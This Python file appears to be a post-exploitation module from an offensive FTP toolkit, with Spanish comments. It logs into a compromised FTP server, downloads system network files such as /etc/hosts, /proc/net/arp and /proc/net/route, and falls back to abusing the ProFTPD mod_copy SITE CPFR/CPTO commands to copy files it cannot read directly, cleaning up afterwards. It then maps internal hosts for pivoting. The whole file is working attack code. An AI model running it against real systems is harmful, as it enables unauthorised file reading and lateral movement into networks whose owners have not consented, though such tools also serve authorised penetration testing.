# scripts/ftp/post/pivot_setup.py
import ftplib
import io
import socket
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

ETC_FILES = [
    "/etc/hosts", "/etc/networks", "/etc/resolv.conf",
    "/etc/network/interfaces", "/etc/hostname",
    "/proc/net/arp", "/proc/net/route",
]

class Script(BaseScript):
    name        = "pivot-setup"
    protocol    = "ftp"
    category    = "post"
    description = "Script propio: post-explotación para pivoting. Lee /etc/hosts y /proc/net/arp para mapear la red interna desde el FTP comprometido."

    def run(self, **kwargs):
        port     = int(kwargs.get("port") or 21)
        timeout  = int(kwargs.get("timeout") or self.target.timeout or 5)
        user     = kwargs.get("user") or self.creds.user or "anonymous"
        password = kwargs.get("password") or self.creds.password or "anonymous@"
        ip       = self.target.ip

        network_info = {}

        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout)
            ftp.login(user, password)

            for etc_file in ETC_FILES:
                try:
                    buf = io.BytesIO()
                    ftp.retrbinary(f"RETR {etc_file}", buf.write)
                    content = buf.getvalue().decode("utf-8", errors="replace")
                    if content:
                        network_info[etc_file] = content
                        print_result("FTP", ip, "pwned",
                                     f"pivot-setup: leído {etc_file} ({len(content)} bytes)")
                        session_db.save_finding(ip, "FTP", "pivot_file_read", etc_file)
                except Exception:
                    try:
                        dst = f"/tmp/lobera_pivot_{etc_file.replace('/', '_')}"
                        ftp.sendcmd(f"SITE CPFR {etc_file}")
                        ftp.sendcmd(f"SITE CPTO {dst}")
                        buf = io.BytesIO()
                        ftp.retrbinary(f"RETR {dst}", buf.write)
                        content = buf.getvalue().decode("utf-8", errors="replace")
                        if content:
                            network_info[etc_file] = content
                            print_result("FTP", ip, "pwned",
                                         f"pivot-setup (mod_copy): leído {etc_file}")
                            session_db.save_finding(ip, "FTP", "pivot_mod_copy", etc_file)
                        ftp.delete(dst)
                    except Exception:
                        pass

            ftp.quit()
        except Exception as e:
            print_result("FTP", ip, "fail", f"error: {e}")
            return None

        if not network_info:
            print_check("pivot-setup: sin acceso a ficheros de red", ok=True)
            return {"network_info": {}}

        internal_hosts = []
        if "/etc/hosts" in network_info:
            for line in network_info["/etc/hosts"].splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    parts = line.split()
                    if len(parts) >= 2:
                        internal_hosts.append((parts[0], parts[1]))

        if internal_hosts:
            print_table(f"Hosts internos (/etc/hosts) — {ip}",
                        ["IP", "Hostname"], internal_hosts[:20])
            for h_ip, h_name in internal_hosts:
                session_db.save_finding(ip, "FTP", "pivot_internal_host", f"{h_ip} {h_name}")

        arp_hosts = []
        if "/proc/net/arp" in network_info:
            for line in network_info["/proc/net/arp"].splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 4 and parts[2] != "0x0":
                    arp_hosts.append((parts[0], parts[3]))

        if arp_hosts:
            print_table(f"ARP cache — {ip}", ["IP", "MAC"], arp_hosts[:20])
            for h_ip, h_mac in arp_hosts:
                session_db.save_finding(ip, "FTP", "pivot_arp_host", f"{h_ip} {h_mac}")

        return {
            "network_info": {k: v[:500] for k, v in network_info.items()},
            "internal_hosts": internal_hosts,
            "arp_hosts": arp_hosts,
        }
